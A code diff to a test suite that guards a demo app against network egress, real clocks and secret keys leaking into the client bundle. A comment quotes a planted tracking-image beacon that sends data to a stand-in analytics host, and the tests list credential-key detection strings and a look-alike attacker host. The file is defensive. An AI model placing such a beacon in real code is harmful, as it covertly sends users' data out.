@@ -19,6 +19,13 @@ import { join } from 'node:path';
 import { describe, expect, it } from 'vitest';
 
 import { NOW } from './data/demo.ts';
+import { impuritiesIn, restatementsIn } from './testing/purity.ts';
+import {
+  foreignImportsIn,
+  offendingAddresses,
+  sendersIn,
+  type InertOrigin,
+} from './testing/egress.ts';
 
 const SRC = new URL('.', import.meta.url).pathname;
 
@@ -49,27 +56,181 @@ const codeOf = (file: string) =>
     .replace(/(^|[^:])\/\/.*$/gm, '$1');
 const relative = (file: string) => file.slice(SRC.length);
 
+/**
+ * THE ADDRESSES THIS BUNDLE IS ALLOWED TO NAME, AND WHY EACH IS INERT.
+ *
+ * Every entry is a decision somebody wrote down. Anything not here is reported,
+ * including a second path on a host already listed — the comparison is on the
+ * origin and it is exact, so `api.canva.com.somewhere-else.test` does not
+ * inherit `api.canva.com`'s allowance.
+ */
+/**
+ * ── AN ADDRESS AN ADD-ON NAMES IS THE ADD-ON'S FACT, NOT THIS APP'S ─────────
+ *
+ * What stood here was a list of origins this app allows, and two of the entries
+ * were Canva's — declared by an app that merely RECEIVES the add-on that names
+ * them. That is AC20/D21 broken in both directions, and it was demonstrated in
+ * both: vendoring the personalizer into this app unchanged, registration only,
+ * turned this suite red on
+ * `add-ons/vendor/personalizer/template.ts → http://www.w3.org/2000/svg`, and
+ * vendoring Canva Import into the studio turned ITS suite red the same way.
+ * Making a portable add-on pass required an edit to an exemption list inside
+ * the host — the exact thing a closed slot registry exists to make unnecessary.
+ *
+ * This is the FOURTH host-local list found holding an add-on's fact, after
+ * `HOSTED_SLOTS`, the Czech "pro" carve-out and the ar-EG numeral allowances.
+ * Round 5 built the mechanism for the third; this is that mechanism, applied.
+ * Every add-on exports `INERT_ORIGINS` from its own `add-on-facts.ts`, the
+ * sync vendors it, and `addOnOrigins()` reads whatever THIS app has vendored.
+ * Vendor an add-on and its declarations arrive; drop it and they leave; nothing
+ * in this file changes either way.
+ *
+ * `import.meta.glob` is resolved by the bundler, so by the time this runs it is
+ * a static list of modules — no filesystem read, no dynamic import.
+ */
+const VENDORED_ORIGINS = import.meta.glob<{
+  INERT_ORIGINS?: readonly { origin: string; why: string }[];
+  NEVER_IN_A_BROWSER?: readonly { text: string; why: string }[];
+}>("./add-ons/vendor/*/add-on-facts.ts", { eager: true });
+
+function addOnOrigins(): InertOrigin[] {
+  return Object.values(VENDORED_ORIGINS).flatMap((module) => [...(module.INERT_ORIGINS ?? [])]);
+}
+
+/**
+ * What every add-on this app vendors declares must never reach a browser.
+ *
+ * The same discovery the inert origins use, off the same file. See
+ * `builtOutput.test.ts` for why these are the add-on's facts and not this
+ * app's, and what shipped green while they were this app's.
+ */
+function addOnNeedles(): { text: string; why: string }[] {
+  return Object.values(VENDORED_ORIGINS).flatMap((module) => [
+    ...(module.NEVER_IN_A_BROWSER ?? []),
+  ]);
+}
+
+
+/**
+ * THIS APP'S OWN, WHICH IS NONE.
+ *
+ * The works names no address anywhere in its own sources — it has no egress to
+ * declare — and an empty list is the strictest state there is: the net reports
+ * EVERY address, so the day this app names one somebody has to come here and
+ * write down why it cannot cause a request.
+ */
+const OURS: readonly InertOrigin[] = [];
+
+/** Ours, plus whatever the add-ons this app vendors declare for themselves. */
+const INERT: readonly InertOrigin[] = [...OURS, ...addOnOrigins()];
+
 describe('no real third-party call, no real clock (24 D11)', () => {
-  it('has no fetch, no XHR and no WebSocket anywhere in the shipped sources', () => {
-    const offenders = SHIPPED.filter((file) =>
-      /\bfetch\s*\(|XMLHttpRequest|new WebSocket|navigator\.sendBeacon/.test(codeOf(file)),
+  /*
+   * D11 AS A RULE, NOT A WORD LIST — and this repo is where the word list was
+   * beaten. A verifier put two real requests inside the vendored delivery
+   * add-on's `UnresolvedDestination`:
+   *
+   *     const img = new Image();
+   *     img.src = "https://tracking.example-analytics.net/p?c=" + …
+   *
+   * `new Image()` is not `fetch(`, `XMLHttpRequest`, `new WebSocket` or
+   * `navigator.sendBeacon`, so the four-word grep that used to stand here saw
+   * nothing, and the bytes reached the live app's bundle. Neither would it have
+   * seen a `<script>` tag, a `<link rel=preconnect>`, a form `action`, a CSS
+   * `url()`, an `<iframe>`, a `Worker`, a dynamic `import()` or `sendBeacon`
+   * under an alias.
+   *
+   * `testing/egress.ts` states the category instead, in three nets. Two of them
+   * are static and are below; the third watches the running page and is in
+   * `add-ons/egress.test.tsx`, because the value handed to `img.src` is not a
+   * property of the text.
+   */
+  it('names no address outside the ones declared inert', () => {
+    const offenders = SHIPPED.flatMap((file) =>
+      offendingAddresses(codeOf(file), INERT).map((url) => `${relative(file)} → ${url}`),
     );
+    expect(offenders).toEqual([]);
+  });
+
+  it('carries nothing that can issue a request', () => {
     // A demo that posted to a real carrier or a real design tool on every
     // visitor's click would be a defect, not a feature. In connected mode the
     // call belongs to the SERVER half of an add-on, which is not in this
     // bundle and cannot be — `scripts/sync-add-ons.sh` refuses to vendor it.
-    expect(offenders.map(relative)).toEqual([]);
+    //
+    // This is also what makes the two declared Canva endpoints above harmless:
+    // an address with no way to send is a string.
+    const offenders = SHIPPED.flatMap((file) => [
+      ...sendersIn(codeOf(file)).map((means) => `${relative(file)} → ${means}`),
+      ...foreignImportsIn(codeOf(file)).map((spec) => `${relative(file)} → ${spec}`),
+    ]);
+    expect(offenders).toEqual([]);
   });
 
+  /*
+   * THE RULE IS `testing/purity.ts` NOW — one file, byte for byte in this repo,
+   * the maker studio and the add-ons monorepo, with the mirror guard there
+   * failing on any difference. There were three separate regular expressions
+   * before, they had drifted, and the drift was invisible: this app never
+   * checked `crypto.randomUUID` and the studio checked neither that nor
+   * `performance.now`, so appending
+   *
+   *     export const zzSeed = { at: performance.now(), id: crypto.randomUUID() };
+   *
+   * to a shipped module left both suites green.
+   */
   it('reads no real clock and rolls no dice', () => {
-    const offenders = SHIPPED.filter((file) =>
-      /Date\.now\s*\(|Math\.random\s*\(|new Date\s*\(\s*\)|performance\.now\s*\(/.test(codeOf(file)),
-    );
     // 21 D6. Every date in the app derives from the pinned moment below, which
     // is what lets `quote.test.ts` assert a promise date and a screenshot taken
     // in a year still match the running demo.
-    expect(offenders.map(relative)).toEqual([]);
+    const offenders = SHIPPED.flatMap((file) =>
+      impuritiesIn(codeOf(file)).map((means) => `${relative(file)} → ${means}`),
+    );
+    expect(offenders).toEqual([]);
   });
+
+  it('would say so if one arrived, in every spelling the three repos disagreed on', () => {
+    // The mutant that proved the drift, driven through the shared rule rather
+    // than through a restatement of it.
+    expect(
+      impuritiesIn('export const zzSeed = { at: performance.now(), id: crypto.randomUUID() };')
+        .length,
+    ).toBe(2);
+    expect(impuritiesIn('const t = Date.now();').length).toBe(1);
+    expect(impuritiesIn('const d = new Date();').length).toBe(1);
+    expect(impuritiesIn('const r = Math.random();').length).toBe(1);
+    expect(impuritiesIn('crypto.getRandomValues(new Uint8Array(8))').length).toBe(1);
+    // …and pure arithmetic over a value passed in stays quiet.
+    expect(impuritiesIn('const d = new Date(Date.UTC(2026, 7, 5));')).toEqual([]);
+    expect(impuritiesIn('const d = new Date(iso);')).toEqual([]);
+    expect(impuritiesIn('const at = clock.now();')).toEqual([]);
+  });
+
+  /**
+   * AND NOBODY HERE MAY STATE THE RULE A SECOND TIME.
+   *
+   * The byte-for-byte mirror guard in the add-ons repo can only see a copy of
+   * `testing/purity.ts` that DIFFERS. It is blind to the commoner shape, which
+   * is a file that never imported it and is running its own regex beside it —
+   * and that is precisely what all four add-on packages were doing while every
+   * suite in this wave was green. This repo is where that would show up as an
+   * app shipping a die, so the check runs here too rather than only in the
+   * monorepo, which a published clone of this app does not have beside it.
+   *
+   * `testing/purity.ts` is excluded because it IS the rule and has to spell
+   * every pattern out. Nothing else may.
+   */
+  it('states that rule in exactly one file, and this is not it', () => {
+    const offenders = ALL.filter((f) => !f.endsWith(join('testing', 'purity.ts'))).flatMap((file) =>
+      restatementsIn(codeOf(file)).map((means) => `${relative(file)} → ${means}`),
+    );
+    expect(
+      offenders,
+      'a pattern of its own beside the shared rule is two rules, and only one of them gets ' +
+        'repaired next time — see testing/purity.ts',
+    ).toEqual([]);
+  });
+
 
   it('is pinned to the demo’s Wednesday', () => {
     expect(NOW).toEqual({ iso: '2026-08-05', hour: 10, minute: 20 });
@@ -77,21 +238,37 @@ describe('no real third-party call, no real clock (24 D11)', () => {
 });
 
 describe('secrets are server-only (24 D15)', () => {
+  /**
+   * ── THE SAME NEEDLES, ONE BUILD EARLIER, AND THEY ARE THE ADD-ON'S ────────
+   *
+   * `builtOutput.test.ts` greps the artefact; this catches a leak at the import
+   * that would have caused one. Both used to spell the needles out — the
+   * credentialled add-on's two `secret: true` setting keys and the type its
+   * server half reads them into — inside an app that merely receives it, so a
+   * THIRD credentialled add-on would have been checked for nothing at all.
+   * They come off each vendored add-on's own `add-on-facts.ts` now; see the
+   * block in `builtOutput.test.ts` for the argument.
+   *
+   * `apiKey` in camelCase is deliberately not among them, and that stays true
+   * whoever declares it: the connect dialog holds one in component state while
+   * the shop types it and drops it on submit, and `shop.connect.apiKey` is the
+   * LABEL on that field. Banning the words a credential form has to say would
+   * be banning the form, not the leak. What must never appear is the key a
+   * value would be SAVED under.
+   *
+   * THE DECLARATION FILES THEMSELVES ARE NOT A LEAK. `add-on-facts.ts` exists
+   * to NAME these strings, so it names them; it is data, it is imported by no
+   * screen, and every other gate in this file — senders, clocks, the ban on
+   * reaching `testing/` — still applies to it exactly as to any other vendored
+   * module. Nothing else is excused.
+   */
   it('keeps every secret setting out of the client half', () => {
-    /*
-     * The MACHINE KEYS of the credentialled add-on's two `secret: true`
-     * settings, and the type its server half reads them into. The packer greps
-     * a built bundle for exactly these; this catches it a build earlier, at the
-     * import that would have leaked one.
-     *
-     * `apiKey` in camelCase is deliberately NOT here. The connect dialog holds
-     * one in component state while the shop types it and drops it on submit,
-     * and `shop.connect.apiKey` is the LABEL on that field — banning the words
-     * a credential form has to say would be banning the form, not the leak.
-     * What must never appear is the key a value would be SAVED under.
-     */
-    const offenders = SHIPPED.filter((file) =>
-      /api_key|account_number|CarrierCredentials/.test(codeOf(file)),
+    const needles = addOnNeedles();
+    expect(needles.length, 'no add-on declared anything server-only').toBeGreaterThan(0);
+    const offenders = SHIPPED.filter(
+      (file) =>
+        !file.endsWith('add-on-facts.ts') &&
+        needles.some((needle) => codeOf(file).includes(needle.text)),
     );
     expect(offenders.map(relative)).toEqual([]);
   });
@@ -313,5 +490,51 @@ describe("the test command a reader is given is the one that is configured", () 
     };
     expect(scripts.scripts.test).toBe("vitest run");
     expect(readFileSync(join(process.cwd(), "README.md"), "utf8")).toContain("npm test");
+  });
+});
+
+/**
+ * AND THE DISCOVERY ITSELF IS GUARDED, because it is only as honest as what it
+ * finds.
+ *
+ * A vendored package that exported nothing would contribute nothing and read
+ * exactly like a package with nothing to declare. A renamed export, or a sync
+ * that dropped the file, would leave this app quietly allowing no origin at all
+ * — which fails loudly here rather than silently on the day an add-on that
+ * really does name an address is vendored.
+ */
+describe('an add-on brings its own inert origins with it (24 AC20, D21)', () => {
+  it('reads a declaration off every add-on this app vendors', () => {
+    const declared = Object.entries(VENDORED_ORIGINS);
+    expect(declared.length, 'no vendored inert-origin declarations were found').toBeGreaterThan(0);
+    const silent = declared
+      .filter(([, module]) => module.INERT_ORIGINS === undefined)
+      .map(([file]) => file);
+    expect(silent, 'these vendored packages export no INERT_ORIGINS').toEqual([]);
+  });
+
+  it('keeps no origin of its own that belongs to an add-on', () => {
+    // The ratchet on the repair. Re-adding an add-on's address to this app's
+    // own list would work, and would put the defect straight back: every entry
+    // here has to be an address THIS app names, and this app names none.
+    expect(OURS).toEqual([]);
+  });
+
+  it('says why, for every origin it allows, wherever it came from', () => {
+    expect(INERT.length, 'nothing was discovered at all').toBeGreaterThan(0);
+    for (const entry of INERT) {
+      expect(
+        { origin: entry.origin, explained: entry.why.length > 30 },
+        `${entry.origin} is allowed with no reason a reviewer can read`,
+      ).toEqual({ origin: entry.origin, explained: true });
+    }
+  });
+
+  it('forgives the declared origin and nothing that merely starts the same', () => {
+    // The comparison is exact, and this is the case that says so: an add-on
+    // declaring `api.canva.com` does not hand a look-alike host an allowance.
+    const declared = INERT[0]!.origin;
+    expect(offendingAddresses(`const a = "${declared}/x";`, INERT)).toEqual([]);
+    expect(offendingAddresses(`const a = "${declared}.attacker.test/x";`, INERT)).not.toEqual([]);
   });
 });
